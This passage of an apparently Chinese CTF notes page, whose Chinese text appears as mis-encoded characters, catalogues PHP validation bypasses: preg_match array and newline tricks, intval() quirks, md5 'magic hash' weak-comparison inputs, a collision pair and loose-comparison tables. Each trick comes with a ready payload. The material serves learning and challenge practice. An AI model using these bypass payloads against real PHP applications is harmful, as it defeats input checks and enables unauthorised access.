href="#è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…" class="headerlink" title="è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…"></a>è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…</h2><ul><li>è´ªå©ªåŒ¹é…ï¼šåŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦</li><li>æƒ°æ€§åŒ¹é…ï¼šåŒ¹é…å°½å¯èƒ½å°‘çš„å­—ç¬¦</li><li>â€œ?â€ï¼šå¦‚æœç´§è·Ÿåœ¨ä»»ä½•é‡è¯*ã€+ã€?æˆ–{}çš„åé¢ï¼Œä¼šä½¿é‡è¯ç¼–ç¨‹æƒ°æ€§ï¼Œä¾‹å¦‚å¯¹â€123abcâ€ä½¿ç”¨<code>/\d+/</code>å°†ä¼šåŒ¹é…â€123â€ï¼Œè€Œä½¿ç”¨<code>/\d+?/</code>åªä¼šåŒ¹é…åˆ°â€1â€</li></ul><div class="table-container"><table><thead><tr><th>å‡½æ•°ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>*?</td><td>é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘çš„åŒ¹é…</td></tr><tr><td>+?</td><td>ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘çš„åŒ¹é…</td></tr><tr><td>??</td><td>0æ¬¡æˆ–1æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘çš„åŒ¹é…</td></tr><tr><td>{n,}?</td><td>è‡³å°‘næ¬¡ï¼Œä½†å°½å¯èƒ½å°‘çš„åŒ¹é…</td></tr><tr><td>{n,m}?</td><td>nåˆ°mæ¬¡ ï¼Œä½†å°½å¯èƒ½å°‘çš„åŒ¹é…</td></tr></tbody></table></div><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><h3 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h3><ul><li>preg_match()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›false</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num[]=1</code></p><h3 id="æ¢è¡Œç»•è¿‡"><a href="#æ¢è¡Œç»•è¿‡" class="headerlink" title="æ¢è¡Œç»•è¿‡"></a>æ¢è¡Œç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: cmd=%0aphp</code></p><h3 id="æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"><a href="#æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡" class="headerlink" title="æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"></a>æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡</h3><blockquote><p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚</p></blockquote><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><ul><li><p>è·å–å˜é‡çš„æ•´æ•°å€¼</p></li><li><p>æˆåŠŸæ—¶è¿”å› var çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ï¼Œç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="literal">false</span>);                   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="literal">true</span>);                    <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ç»•è¿‡"><a href="#å­—ç¬¦ç»•è¿‡" class="headerlink" title="å­—ç¬¦ç»•è¿‡"></a>å­—ç¬¦ç»•è¿‡</h3><ul><li>intval()è€Œè¨€ï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªä¸æ˜¯æ•°å­—çš„å­—ç¬¦ä¹‹å‰çš„æ•°å­—ä¸²æ‰€ä»£è¡¨çš„æ•´æ•°å€¼ã€‚å¦‚æœå­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªæ˜¯â€˜-â€™ï¼Œåˆ™ä»ç¬¬äºŒä¸ªå¼€å§‹ç®—èµ·ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476a</code></p><h3 id="ç§‘å­¦è®¡æ•°æ³•"><a href="#ç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="ç§‘å­¦è®¡æ•°æ³•"></a>ç§‘å­¦è®¡æ•°æ³•</h3><ul><li>intval()å‡½æ•°å¦‚æœbaseä¸º0ï¼Œåˆ™varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å–ï¼Œä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­è¡¨ç¤ºç§‘å­¦è®¡æ•°æ³•ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476e1</code></p><h3 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h3><blockquote><p>0b?? : äºŒè¿›åˆ¶<br>0??? : å…«è¿›åˆ¶<br>0X?? : åå…­è¿›åˆ¶</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=010574</code></p><h3 id="å°æ•°ç‚¹ç»•è¿‡"><a href="#å°æ•°ç‚¹ç»•è¿‡" class="headerlink" title="å°æ•°ç‚¹ç»•è¿‡"></a>å°æ•°ç‚¹ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476.0</code></p><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span>() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line"><span class="title function_ invoke__">stripos</span>() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line"><span class="title function_ invoke__">strrpos</span>() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line"><span class="title function_ invoke__">strripos</span>() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨+ä»£æ›¿ç©ºæ ¼ç»•è¿‡</li></ul><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul><li><a href="https://www.freesion.com/article/53561386476/">md5ç»•è¿‡</a></li></ul><h3 id="å¼±æ¯”è¾ƒ"><a href="#å¼±æ¯”è¾ƒ" class="headerlink" title="å¼±æ¯”è¾ƒ"></a>å¼±æ¯”è¾ƒ</h3><ul><li><p>åªè¦ä¸¤ä¸ªæ•°çš„md5åŠ å¯†åçš„å€¼ä»¥0eå¼€å¤´å°±å¯ä»¥ç»•è¿‡ï¼Œå› ä¸ºphpåœ¨è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒæ—¶,ä¼šç°è½¬æ¢å­—ç¬¦ä¸²çš„ç±»å‹ï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒï¼Œè€Œåœ¨æ¯”è¾ƒæ˜¯å› ä¸ºä¸¤ä¸ªæ•°éƒ½æ˜¯ä»¥0eå¼€å¤´ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œ0eåé¢åŠ ä»»ä½•æ•°åœ¨ç§‘å­¦è®¡æ•°æ³•ä¸­éƒ½æ˜¯0ï¼Œæ‰€ä»¥ä¸¤æ•°ç›¸ç­‰</p></li><li><p>åœ¨è¿™æ ·çš„å¼±æ¯”è¾ƒé‡Œï¼Œ0eå¼€å¤´çš„ä¼šè¢«è¯†åˆ«æˆç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ¯”è¾ƒæ—¶<code>0=0</code>ä¸ºtrueç»•è¿‡</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">240610708</span>:<span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT:<span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO:<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY:<span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ:<span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF:<span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV:<span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC:<span class="number">0e478478466848439040434801845361</span></span><br></pre></td></tr></table></figure><h3 id="å¼ºæ¯”è¾ƒ"><a href="#å¼ºæ¯”è¾ƒ" class="headerlink" title="å¼ºæ¯”è¾ƒ"></a>å¼ºæ¯”è¾ƒ</h3><ul><li>æ•°ç»„ç»•è¿‡</li><li>å¦‚æœä¼ å…¥çš„ä¸æ˜¯å­—ç¬¦ä¸²è€Œæ˜¯æ•°ç»„ï¼Œä¸ä½†md5()å‡½æ•°ä¸ä¼šæŠ¥é”™ï¼Œç»“æœè¿˜ä¼šè¿”å›nullï¼Œåœ¨å¼ºæ¯”è¾ƒé‡Œé¢<code>null=null</code>ä¸ºtrueç»•è¿‡</li></ul><h3 id="md5ç¢°æ’"><a href="#md5ç¢°æ’" class="headerlink" title="md5ç¢°æ’"></a>md5ç¢°æ’</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;])===md5($_GET[&#x27;b&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœŸå®md5ç¢°æ’ï¼Œå› ä¸ºæ­¤æ—¶ä¸èƒ½è¾“å…¥æ•°ç»„äº†ï¼Œåªèƒ½è¾“å…¥å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><ul><li><p>æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p></li><li><p>æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°æ—¶å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢</p></li><li><code>eg:x=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</code></li></ul><h1 id="phpå¼±æ¯”è¾ƒ"><a href="#phpå¼±æ¯”è¾ƒ" class="headerlink" title="phpå¼±æ¯”è¾ƒ"></a>phpå¼±æ¯”è¾ƒ</h1><h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><ul><li>æ˜¾ç¤ºå˜é‡ç›¸å…³ä¿¡æ¯</li><li>å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ<ul><li>å¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</li></ul></li></ul><h2 id="å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ"><a href="#å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ" class="headerlink" title="å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ"></a>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;a&#x27;</span> == <span class="number">0</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1a&#x27;</span> == <span class="number">1</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;12a&#x27;</span> == <span class="number">1</span>);<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure><ul><li>ä¼šå‡ºç°ä¸Šé¢çš„ç»“æœæ˜¯å› ä¸ºå­—ç¬¦ä¸²åœ¨å’Œæ•°å­—æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œæ¯”å¦‚aè½¬æ¢å¤±è´¥æˆfalseï¼Œfalseåˆå’Œ0å¼±ç±»å‹æ¯”è¾ƒæ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ˜¯trueã€‚</li><li>ä½†æ˜¯å¦‚æœå­—ç¬¦ä¸²æ˜¯ä»¥æ•°å­—å¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æˆè¿™ä¸ªæ•°å­—å†åšæ¯”è¾ƒï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªä¹Ÿæ˜¯trueï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯å› ä¸ºè½¬æˆæ•°å­—åå˜æˆäº†12ï¼Œä¸ç­‰äº1ï¼Œåˆ™ä¸ºfalseã€‚</li></ul><h2 id="å¸ƒå°”trueå’Œä»»æ„æ¯”è¾ƒ"><a href="#å¸ƒå°”trueå’Œä»»æ„æ¯”è¾ƒ" class="headerlink" title="å¸ƒå°”trueå’Œä»»æ„æ¯”è¾ƒ"></a>å¸ƒå°”trueå’Œä»»æ„æ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="number">0</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="string">&#x27;False&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="number">2</span>);<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><ul><li>bool 1å’Œä»»ä½•æ¯”è¾ƒéƒ½ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0ä¹Ÿè®¤ä¸ºæ˜¯bool falseï¼Œtrueæ˜¯ä¸ç­‰äºfalseçš„ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¡æ˜¯falseï¼Œå…¶ä½™çš„å…¨æ˜¯trueã€‚</li></ul><h2 id="hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ"><a href="#hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ" class="headerlink" title="hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ"></a>hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒ</h2><ul><li>hash: å“ˆå¸Œç®—æ³•</li><li>ç‰¹ç‚¹ï¼š<ul><li>å¯¹äºç‰¹å®šçš„hashç®—æ³•è¾“å‡ºç»“æœçš„é•¿åº¦æ€»æ˜¯ä¸€å®šçš„ï¼›</li><li>å¯¹äºç›¸åŒçš„è¾“å…¥å†…å®¹ä¸ç®¡æ‰§è¡Œå¤šå°‘æ¬¡hashå‡½æ•°ï¼Œæ€»ä¼šå¾—åˆ°ç›¸åŒçš„hashå€¼ï¼›</li><li>å¯¹äºè¾“å…¥å­—ç¬¦ä¸²å“ªæ€•åŠå…¶å¾®å°çš„å˜åŠ¨ä¹Ÿä¼šå¼•èµ·è¾“å‡ºç»“æœå·¨å¤§çš„å˜åŒ–</li><li>å“ˆå¸Œè¿‡ç¨‹æ˜¯å•å‘çš„ï¼Œå³ä¸èƒ½é€šè¿‡ç‰¹å®šçš„å‡½æ•°ä»hashå€¼æ¢å¤å‡ºåŸå§‹æ•°æ®ã€‚</li></ul></li><li>å¸¸è§çš„hashç®—æ³•: MD5ã€SHA1ã€SHA224ã€SHA256ã€SHA512ç­‰</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>);<span 